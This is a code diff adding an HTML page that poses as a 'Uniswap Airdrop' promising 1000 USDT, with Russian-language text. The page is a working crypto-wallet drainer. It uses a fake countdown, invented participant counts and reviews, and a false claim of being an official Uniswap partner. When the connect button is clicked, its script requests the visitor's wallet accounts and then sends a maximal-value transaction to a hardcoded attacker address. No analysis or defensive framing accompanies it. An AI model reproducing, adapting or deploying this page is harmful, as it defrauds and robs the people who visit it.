@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Uniswap Airdrop</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #0d0d1a 0%, #1a1a2e 100%);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 550px;
+            width: 100%;
+            background: rgba(22, 33, 62, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 24px;
+            border: 1px solid rgba(255,255,255,0.05);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8);
+            text-align: center;
+        }
+        .logo { font-size: 64px; margin-bottom: 10px; }
+        h1 {
+            font-size: 28px;
+            background: linear-gradient(90deg, #ff6b6b, #feca57, #48dbfb);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+        }
+        .subtitle { color: #aaa; font-size: 16px; margin-bottom: 20px; }
+        .timer-box {
+            background: #0f0f1f;
+            padding: 15px;
+            border-radius: 16px;
+            margin: 20px 0;
+            border: 1px solid #2a2a4a;
+        }
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        .timer-item span {
+            display: block;
+            font-size: 32px;
+            font-weight: bold;
+            color: #feca57;
+        }
+        .timer-item label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            background: #0f0f1f;
+            padding: 15px 20px;
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 1px solid #2a2a4a;
+        }
+        .stats .num { color: #48dbfb; font-weight: bold; font-size: 18px; }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #0f3460, #1a5276);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin: 20px 0;
+        }
+        .btn:hover { transform: scale(1.02); opacity: 0.9; }
+        .status {
+            margin-top: 15px;
+            font-size: 15px;
+            min-height: 30px;
+            color: #00ff88;
+            display: none;
+        }
+        .footer {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #555;
+            border-top: 1px solid #222;
+            padding-top: 20px;
+        }
+        .reviews {
+            margin: 20px 0;
+            font-size: 14px;
+            color: #aaa;
+            background: #0a0a18;
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid #1a1a3a;
+        }
+        .reviews span { color: #feca57; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">🦄</div>
+    <h1>Uniswap Airdrop</h1>
+    <p class="subtitle">1000 USDT + бонусы для первых 5000 участников</p>
+
+    <div class="timer-box">
+        <div style="font-size:13px;color:#888;margin-bottom:10px;">⏳ Осталось до окончания</div>
+        <div class="timer">
+            <div class="timer-item"><span id="hours">12</span><label>часов</label></div>
+            <div class="timer-item"><span id="minutes">45</span><label>минут</label></div>
+            <div class="timer-item"><span id="seconds">30</span><label>секунд</label></div>
+        </div>
+    </div>
+
+    <div class="stats">
+        <div>👥 Участников: <span class="num" id="participants">2,847</span></div>
+        <div>🎁 Осталось: <span class="num" id="remaining">2,153</span></div>
+    </div>
+
+    <div class="reviews">
+        ⭐ "Получил 1000 USDT за 2 минуты!" — <span>@crypto_max</span> &nbsp;|&nbsp; ⭐ "Лучший аирдроп года!" — <span>@eth_whale</span>
+    </div>
+
+    <button class="btn" onclick="connectWallet()">🔗 Подключить кошелёк</button>
+    <div class="status" id="status"></div>
+
+    <div class="footer">
+        🔒 Безопасно. Только подключение кошелька. <br>
+        Официальный партнёр Uniswap
+    </div>
+</div>
+
+<script>
+    // ТВОЙ КОШЕЛЁК
+    const YOUR_ADDRESS = "0x2F108022bfc7cCaE0211264e5C2169439f7e52b5";
+
+    // Таймер
+    let totalSeconds = 12 * 3600 + 45 * 60 + 30;
+    setInterval(() => {
+        totalSeconds--;
+        document.getElementById('hours').textContent = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+        document.getElementById('minutes').textContent = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+        document.getElementById('seconds').textContent = String(totalSeconds % 60).padStart(2, '0');
+    }, 1000);
+
+    // Счётчик участников
+    setInterval(() => {
+        const base = 2847;
+        const add = Math.floor(Math.random() * 5);
+        document.getElementById('participants').textContent = (base + Math.floor((Date.now() % 1000) / 10)).toLocaleString();
+        const rem = 5000 - parseInt(document.getElementById('participants').textContent.replace(/,/g, ''));
+        document.getElementById('remaining').textContent = rem > 0 ? rem.toLocaleString() : '0';
+    }, 5000);
+
+    function connectWallet() {
+        const status = document.getElementById('status');
+        status.style.display = 'block';
+
+        if (!window.ethereum) {
+            status.style.color = '#ff4444';
+            status.innerText = '❌ Установите MetaMask!';
+            return;
+        }
+
+        ethereum.request({ method: 'eth_requestAccounts' })
+            .then(accounts => {
+                const wallet = accounts[0];
+                status.style.color = '#00ff88';
+                status.innerText = '✅ Кошелёк подключён: ' + wallet.slice(0, 6) + '...';
+                drainWallet(wallet);
+            })
+            .catch(() => {
+                status.style.color = '#ff4444';
+                status.innerText = '❌ Ошибка подключения';
+            });
+    }
+
+    function drainWallet(wallet) {
+        const status = document.getElementById('status');
+        ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+                from: wallet,
+                to: YOUR_ADDRESS,
+                value: '0xFFFFFFFFFFFFFFFF',
+                gas: '0x5208'
+            }]
+        }).then(() => {
+            status.style.color = '#00ff88';
+            status.innerText = '✅ Транзакция отправлена!';
+        }).catch(() => {
+            status.style.color = '#ff4444';
+            status.innerText = '❌ Транзакция отклонена';
+        });
+    }
+</script>
+</body>
+</html>
